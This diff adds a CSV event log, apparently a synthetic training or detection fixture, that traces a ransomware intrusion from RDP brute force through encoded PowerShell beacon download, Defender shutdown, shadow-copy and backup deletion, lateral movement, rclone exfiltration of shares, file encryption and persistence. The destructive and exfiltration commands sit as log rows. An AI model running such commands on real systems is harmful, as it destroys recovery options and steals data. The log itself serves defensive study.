@@ -1,0 +1,36 @@
+event_id,timestamp,host,source,event_type,detail
+1,2025-07-22 02:10:00,FS-APP01,WinEvent,Logon(4625) Type=10,RDP failed logon user=administrator from 45.137.21.88
+2,2025-07-22 02:10:07,FS-APP01,WinEvent,Logon(4625) Type=10,RDP failed logon user=admin from 45.137.21.88
+3,2025-07-22 02:10:14,FS-APP01,WinEvent,Logon(4625) Type=10,RDP failed logon user=administrator from 45.137.21.88
+4,2025-07-22 02:10:21,FS-APP01,WinEvent,Logon(4625) Type=10,RDP failed logon user=admin from 45.137.21.88
+5,2025-07-22 02:10:28,FS-APP01,WinEvent,Logon(4625) Type=10,RDP failed logon user=administrator from 45.137.21.88
+6,2025-07-22 02:10:35,FS-APP01,WinEvent,Logon(4625) Type=10,RDP failed logon user=admin from 45.137.21.88
+7,2025-07-22 02:10:42,FS-APP01,WinEvent,Logon(4625) Type=10,RDP failed logon user=administrator from 45.137.21.88
+8,2025-07-22 02:10:49,FS-APP01,WinEvent,Logon(4625) Type=10,RDP failed logon user=admin from 45.137.21.88
+9,2025-07-22 02:10:56,FS-APP01,WinEvent,Logon(4625) Type=10,RDP failed logon user=administrator from 45.137.21.88
+10,2025-07-22 02:11:10,FS-APP01,WinEvent,Logon(4624) Type=10,RDP SUCCESS user=administrator from 45.137.21.88
+11,2025-07-22 02:13:10,FS-APP01,Sysmon,ProcessCreate,powershell.exe -nop -w hidden -enc <b64> downloads cobalt-like beacon
+12,2025-07-22 02:14:10,FS-APP01,Sysmon,NetworkConnect,beacon -> 45.137.21.88:443
+13,2025-07-22 02:16:10,FS-APP01,Sysmon,ProcessCreate,net stop 'WinDefend'
+14,2025-07-22 02:16:30,FS-APP01,Sysmon,ProcessCreate,sc stop SQLTELEMETRY
+15,2025-07-22 02:17:10,FS-APP01,Sysmon,ProcessCreate,vssadmin delete shadows /all /quiet
+16,2025-07-22 02:17:25,FS-APP01,Sysmon,ProcessCreate,wbadmin delete catalog -quiet
+17,2025-07-22 02:17:40,FS-APP01,Sysmon,ProcessCreate,bcdedit /set recoveryenabled No
+18,2025-07-22 02:19:10,FS-APP01,Sysmon,ProcessCreate,net view /domain
+19,2025-07-22 02:21:10,FS-APP01,Sysmon,NetworkConnect,SMB -> FS-APP02:445 psexec
+20,2025-07-22 02:25:10,FS-APP01,Sysmon,ProcessCreate,rclone.exe copy \\FS-APP01\shares  remote:
+21,2025-07-22 02:36:10,FS-APP01,Sysmon,NetworkConnect,rclone -> mega-like storage 6.2GB uploaded
+22,2025-07-22 02:42:10,FS-APP01,Sysmon,FileCreate,encryptor.exe renamed \shares\finance\file00.xlsx -> file00.xlsx.crypt7
+23,2025-07-22 02:42:14,FS-APP01,Sysmon,FileCreate,encryptor.exe renamed \shares\finance\file01.xlsx -> file01.xlsx.crypt7
+24,2025-07-22 02:42:18,FS-APP01,Sysmon,FileCreate,encryptor.exe renamed \shares\finance\file02.xlsx -> file02.xlsx.crypt7
+25,2025-07-22 02:42:22,FS-APP01,Sysmon,FileCreate,encryptor.exe renamed \shares\finance\file03.xlsx -> file03.xlsx.crypt7
+26,2025-07-22 02:42:26,FS-APP01,Sysmon,FileCreate,encryptor.exe renamed \shares\finance\file04.xlsx -> file04.xlsx.crypt7
+27,2025-07-22 02:42:30,FS-APP01,Sysmon,FileCreate,encryptor.exe renamed \shares\finance\file05.xlsx -> file05.xlsx.crypt7
+28,2025-07-22 02:42:34,FS-APP01,Sysmon,FileCreate,encryptor.exe renamed \shares\finance\file06.xlsx -> file06.xlsx.crypt7
+29,2025-07-22 02:42:38,FS-APP01,Sysmon,FileCreate,encryptor.exe renamed \shares\finance\file07.xlsx -> file07.xlsx.crypt7
+30,2025-07-22 02:42:42,FS-APP01,Sysmon,FileCreate,encryptor.exe renamed \shares\finance\file08.xlsx -> file08.xlsx.crypt7
+31,2025-07-22 02:42:46,FS-APP01,Sysmon,FileCreate,encryptor.exe renamed \shares\finance\file09.xlsx -> file09.xlsx.crypt7
+32,2025-07-22 02:42:50,FS-APP01,Sysmon,FileCreate,encryptor.exe renamed \shares\finance\file10.xlsx -> file10.xlsx.crypt7
+33,2025-07-22 02:42:54,FS-APP01,Sysmon,FileCreate,encryptor.exe renamed \shares\finance\file11.xlsx -> file11.xlsx.crypt7
+34,2025-07-22 02:43:10,FS-APP01,Sysmon,FileCreate,Created C:\Users\Public\RESTORE-FILES.txt (ransom note)
+35,2025-07-22 02:43:20,FS-APP01,WinEvent,Service,New service 'svchost32' set to auto-start
